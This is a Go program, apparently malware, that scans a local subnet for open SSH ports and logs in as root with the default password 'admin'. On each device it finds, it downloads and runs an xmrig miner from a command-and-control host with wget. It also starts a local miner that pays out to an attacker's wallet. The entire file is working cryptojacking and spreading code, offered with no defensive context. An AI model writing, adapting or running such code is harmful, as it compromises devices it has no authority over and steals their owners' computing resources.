package main

import (
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	minerBinaryURL = "http://malicious-c2.com/xmrig"
	sshPort        = 22
	sshUser        = "root"
	sshPass        = "admin"
	scanSubnet     = "192.168.1.0/24"
)

func main() {
	fmt.Println("[*] Starting IoT miner deployment...")
	victims := scanNetwork()
	deployMiners(victims)
	startMining()
}

func scanNetwork() []string {
	var liveHosts []string
	ip, ipnet, _ := net.ParseCIDR(scanSubnet)
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		if isPortOpen(ip.String(), sshPort) {
			fmt.Printf("[+] Found vulnerable device: %s\n", ip)
			liveHosts = append(liveHosts, ip.String())
		}
	}
	return liveHosts
}

func isPortOpen(host string, port int) bool {
	timeout := time.Second * 2
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func deployMiners(hosts []string) {
	for _, host := range hosts {
		fmt.Printf("[*] Deploying to %s...\n", host)
		cmd := exec.Command("sshpass", "-p", sshPass, "ssh",
			"-o", "StrictHostKeyChecking=no",
			"-o", "ConnectTimeout=5",
			fmt.Sprintf("%s@%s", sshUser, host),
			"wget -q -O /tmp/miner "+minerBinaryURL+" && chmod +x /tmp/miner && /tmp/miner --daemon")
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Run()
		if strings.Contains(out.String(), "error") {
			fmt.Printf("[-] Failed on %s\n", host)
		}
	}
}

func startMining() {
	cmd := exec.Command("./miner", "--url=pool.malicious.mining:3333",
		"--user=attack_wallet", "--pass=x", "--donate-level=0")
	cmd.Start()
	fmt.Println("[*] Miner started locally as fallback.")
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}